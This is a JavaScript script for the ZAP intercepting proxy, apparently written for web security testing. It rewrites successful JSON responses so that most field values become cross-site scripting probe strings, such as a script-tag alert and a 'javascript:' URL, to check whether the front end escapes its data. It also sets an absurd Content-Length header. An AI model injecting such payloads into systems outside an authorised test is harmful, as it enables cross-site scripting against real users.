/*exported sendingRequest, responseReceived*/
// Logging with the script name is super helpful!
function logger() {
    print(this['zap.script.name'] + '] ' +  arguments[0]);
}


var ignoreKeys = [
   'id', 'status'
];

// @todo
// var signatures = {};

function injectXssPayloads(data) {
  if (Array.isArray(data)) {
	  /*
    for (var i in data) {
      data[i] = injectXssPayloads(data[i]);
    }
    */
    if (data.length > 0) {
      data[0] = injectXssPayloads(data[0]);
    }    
    return data;
  }
  
  if (typeof data !== 'object') {
    return data;
  }
   
  var payloads = [
	  "<script>alert('{key}')</script>",
    "javascript:alert('{key}')",
	  "'>{key}</a>", 
  ];
  var idx = 0;
  for (var key in data) {
    var val = data[key];
	  // logger(key, typeof val)
    if (ignoreKeys.indexOf(key) !== -1) {
      continue;
    }

    if (typeof val === 'object') {
      val = injectXssPayloads(val)
    } else {
	    if (!payloads[idx]) {
        idx = 0;
      }
      val = payloads[idx].replace("{key}", key);
      idx++;
    }
    data[key] = val;
  }
  return data;
}

function sendingRequest(msg, initiator, helper) {}

function responseReceived(msg, initiator, helper) {
	var statusCode = msg.getResponseHeader().getStatusCode();
  if (!(statusCode >= 200 && statusCode <= 299)) {
    return;
  }
  
  var path = msg.getRequestHeader().getURI().getPath();
  var body = msg.getResponseBody().toString();
  var contentType = msg.getResponseHeader().getHeader('Content-Type');

	if (contentType === null) {
    return;
  }

  if (body === null) {
    return;
  }

  var start = body[0];

  if (!~contentType.indexOf("json")) {
    return;
  }
  
  if (~path.indexOf("i18n")) {
    return;
  }

  if (start == "{" || start == "[") {
    var data = {};

    try {
      data = JSON.parse(body);
    } catch (e) {
      logger("err", e)
      return;
    }

    logger("Injecting for " + path)
    data = injectXssPayloads(data);
	 	var serialized = JSON.stringify(data)
		msg.setResponseBody(serialized );
		msg.getResponseHeader().setContentLength(1000000000000000000) // serialized.length)
  }
}